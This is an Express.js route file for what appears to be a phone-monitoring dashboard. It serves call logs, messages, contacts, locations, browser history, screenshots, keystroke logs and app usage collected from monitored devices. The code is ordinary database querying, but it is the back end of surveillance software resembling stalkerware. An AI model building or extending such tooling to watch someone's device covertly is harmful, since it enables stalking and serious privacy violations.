const express = require('express');
const router = express.Router();
const { protect } = require('../middleware/auth');
const Device = require('../models/Device');
const CallLog = require('../models/CallLog');
const Message = require('../models/Message');
const Contact = require('../models/Contact');
const Location = require('../models/Location');
const BrowserHistory = require('../models/BrowserHistory');
const Screenshot = require('../models/Screenshot');
const Keylog = require('../models/Keylog');
const KeywordAlert = require('../models/KeywordAlert');
const Geofence = require('../models/Geofence');
const AppUsage = require('../models/AppUsage');

const getDeviceIds = async (userId) => {
  const devices = await Device.find({ userId });
  return devices.map(d => d._id);
};

// Dashboard stats
router.get('/stats', protect, async (req, res) => {
  const deviceIds = await getDeviceIds(req.user._id);
  const totalDevices = deviceIds.length;
  const totalMessages = await Message.countDocuments({ deviceId: { $in: deviceIds } });
  const totalCalls = await CallLog.countDocuments({ deviceId: { $in: deviceIds } });
  const totalLocations = await Location.countDocuments({ deviceId: { $in: deviceIds } });
  const totalScreenshots = await Screenshot.countDocuments({ deviceId: { $in: deviceIds } });
  res.json({ success: true, stats: { totalDevices, totalMessages, totalCalls, totalLocations, totalScreenshots } });
});

// Get devices
router.get('/devices', protect, async (req, res) => {
  const devices = await Device.find({ userId: req.user._id });
  res.json({ success: true, data: devices });
});

// Get call logs
router.get('/calls', protect, async (req, res) => {
  const deviceIds = await getDeviceIds(req.user._id);
  const data = await CallLog.find({ deviceId: { $in: deviceIds } }).sort({ timestamp: -1 }).limit(200);
  res.json({ success: true, data });
});

// Get messages
router.get('/messages', protect, async (req, res) => {
  const deviceIds = await getDeviceIds(req.user._id);
  const data = await Message.find({ deviceId: { $in: deviceIds } }).sort({ timestamp: -1 }).limit(200);
  res.json({ success: true, data });
});

// Get contacts
router.get('/contacts', protect, async (req, res) => {
  const deviceIds = await getDeviceIds(req.user._id);
  const data = await Contact.find({ deviceId: { $in: deviceIds } });
  res.json({ success: true, data });
});

// Get locations
router.get('/locations', protect, async (req, res) => {
  const deviceIds = await getDeviceIds(req.user._id);
  const data = await Location.find({ deviceId: { $in: deviceIds } }).sort({ timestamp: -1 }).limit(200);
  res.json({ success: true, data });
});

// Get browser history
router.get('/browser', protect, async (req, res) => {
  const deviceIds = await getDeviceIds(req.user._id);
  const data = await BrowserHistory.find({ deviceId: { $in: deviceIds } }).sort({ visitTime: -1 }).limit(200);
  res.json({ success: true, data });
});

// Get screenshots
router.get('/screenshots', protect, async (req, res) => {
  const deviceIds = await getDeviceIds(req.user._id);
  const data = await Screenshot.find({ deviceId: { $in: deviceIds } }).sort({ timestamp: -1 }).limit(100);
  res.json({ success: true, data });
});

// Get keylogs
router.get('/keylogs', protect, async (req, res) => {
  const deviceIds = await getDeviceIds(req.user._id);
  const data = await Keylog.find({ deviceId: { $in: deviceIds } }).sort({ timestamp: -1 }).limit(500);
  res.json({ success: true, data });
});

// Get keyword alerts
router.get('/keyword-alerts', protect, async (req, res) => {
  const deviceIds = await getDeviceIds(req.user._id);
  const data = await KeywordAlert.find({ deviceId: { $in: deviceIds } }).sort({ timestamp: -1 }).limit(200);
  res.json({ success: true, data });
});

// Get geofence events
router.get('/geofence', protect, async (req, res) => {
  const deviceIds = await getDeviceIds(req.user._id);
  const data = await Geofence.find({ deviceId: { $in: deviceIds } }).sort({ timestamp: -1 }).limit(200);
  res.json({ success: true, data });
});

// Get app usage
router.get('/app-usage', protect, async (req, res) => {
  const deviceIds = await getDeviceIds(req.user._id);
  const data = await AppUsage.find({ deviceId: { $in: deviceIds } }).sort({ timestamp: -1 }).limit(200);
  res.json({ success: true, data });
});

// Combined recent activity (for dashboard)
router.get('/recent', protect, async (req, res) => {
  const deviceIds = await getDeviceIds(req.user._id);
  const calls = await CallLog.find({ deviceId: { $in: deviceIds } }).sort({ timestamp: -1 }).limit(10);
  const messages = await Message.find({ deviceId: { $in: deviceIds } }).sort({ timestamp: -1 }).limit(10);
  const locations = await Location.find({ deviceId: { $in: deviceIds } }).sort({ timestamp: -1 }).limit(10);
  const keylogs = await Keylog.find({ deviceId: { $in: deviceIds } }).sort({ timestamp: -1 }).limit(10);
  // combine and sort by timestamp
  let all = [...calls, ...messages, ...locations, ...keylogs];
  all.sort((a,b) => new Date(b.timestamp) - new Date(a.timestamp));
  res.json({ success: true, data: all.slice(0, 30) });
});

module.exports = router;